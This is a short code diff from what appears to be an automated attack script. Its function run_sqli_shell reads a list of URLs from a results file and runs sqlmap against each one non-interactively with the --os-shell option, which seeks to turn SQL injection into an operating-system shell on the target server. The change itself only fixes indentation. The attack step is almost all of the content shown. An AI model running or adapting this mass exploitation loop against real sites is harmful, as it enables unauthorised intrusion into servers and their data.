@@ -133,9 +133,9 @@ def run_sqli_shell():
     if not os.path.exists(RESULTS_DIR):
         os.makedirs(RESULTS_DIR)
 
-with open("results/sqli_shell.txt", "r") as f:
+    with open("results/sqli_shell.txt", "r") as f:
         urls = f.readlines()
-for url in urls:
+    for url in urls:
         url = url.strip()
         subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--os-shell", "--output-dir=sql"])
 
